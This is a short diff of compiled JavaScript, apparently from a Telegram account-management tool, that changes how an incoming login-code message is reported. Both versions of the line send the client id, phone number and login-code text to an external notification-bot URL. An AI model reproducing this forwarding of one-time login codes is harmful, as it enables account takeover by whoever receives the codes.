@@ -108,7 +108,7 @@ async function handleIncomingEvent(ctx, event) {
             ctx.logger.info(ctx.phoneNumber, event.message.text.toLowerCase());
             ctx.logger.info(ctx.phoneNumber, `Login Code received for - ${ctx.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
             ctx.logger.info(ctx.phoneNumber, 'Date :', new Date(event.message.date * 1000));
-            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${ctx.phoneNumber}\n${event.message.text}`)}`);
+            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Login Code Received\n\nClient: ${process.env.clientId || 'unknown'}\nMobile: ${ctx.phoneNumber}\nMessage: ${event.message.text?.substring(0, 100)}`)}`);
         }
     }
 }
